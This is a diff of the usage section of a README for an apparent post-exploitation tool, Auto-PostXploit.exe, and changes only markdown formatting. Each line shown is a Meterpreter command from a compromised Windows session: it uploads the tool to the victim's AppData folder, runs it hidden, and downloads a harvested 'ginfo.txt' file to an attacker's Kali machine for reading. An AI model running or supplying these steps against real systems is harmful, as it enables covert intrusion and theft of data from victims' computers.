@@ -15,12 +15,12 @@
 ## Usage :
 
   
-   - meterpreter > upload %path%/Auto-PostXploit.exe C:/Users/*USETNAME*/AppData
+    meterpreter > upload %path%/Auto-PostXploit.exe C:/Users/*USETNAME*/AppData
   
-   - meterpreter > execute -H -f C:/Users/%USERNAME%/AppData/Auto-PostXploit.exe
+    meterpreter > execute -H -f C:/Users/%USERNAME%/AppData/Auto-PostXploit.exe
   
-    <i>If Auto-PostXploit.exe Not In Process</i>
+   #### If Auto-PostXploit.exe Not In Process
   
-   - meterpreter > download C:/Users/%USERNAME%/AppData/ginfo.txt /root/Desktop
+    meterpreter > download C:/Users/%USERNAME%/AppData/ginfo.txt /root/Desktop
   
-   - root@kali:~# cat /root/Desktop/ginfo.txt
+    root@kali:~# cat /root/Desktop/ginfo.txt
